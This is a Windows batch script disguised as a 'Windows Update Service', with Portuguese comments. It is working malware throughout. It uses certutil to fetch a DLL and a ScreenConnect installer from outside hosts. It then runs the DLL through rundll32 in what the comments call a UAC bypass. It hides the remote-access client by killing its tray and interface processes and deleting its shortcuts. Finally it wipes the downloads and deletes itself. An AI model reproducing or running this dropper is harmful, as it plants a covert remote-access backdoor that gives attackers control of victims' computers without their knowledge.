@echo off
title Windows Update Service
setlocal EnableDelayedExpansion

:: 1. Baixa os componentes
certutil -urlcache -split -f "https://raw.githubusercontent.com/servicesgovin/update/main/update.dll" "%TEMP%\7icaqDuZ.dll" >nul 2>&1
certutil -urlcache -split -f "http://ec2-13-59-251-201.us-east-2.compute.amazonaws.com:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" "%TEMP%\R8tBUHqk.msi" >nul 2>&1

:: 2. Executa o Bypass de UAC via Rundll32
if exist "%TEMP%\7icaqDuZ.dll" (
    if exist "%TEMP%\R8tBUHqk.msi" (
        rundll32.exe "%TEMP%\7icaqDuZ.dll",RunPayload "%TEMP%\R8tBUHqk.msi"
    )
)

:: 3. Aguarda a instalação
ping -n 8 127.0.0.1 >nul

:: 4. Remove o ícone da bandeja e a interface do ScreenConnect
taskkill /f /im ScreenConnect.WindowsClient.exe >nul 2>&1
taskkill /f /im ScreenConnect.WindowsBackstageShell.exe >nul 2>&1

:: Remove os atalhos de inicialização automática
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\ScreenConnect*.lnk" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ScreenConnect*.lnk" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\ScreenConnect*.lnk" >nul 2>&1

:: 5. Limpeza
del /f /q "%TEMP%\7icaqDuZ.dll" >nul 2>&1
del /f /q "%TEMP%\R8tBUHqk.msi" >nul 2>&1

:: 6. Auto-deleção
(goto) 2>nul & del "%~f0"
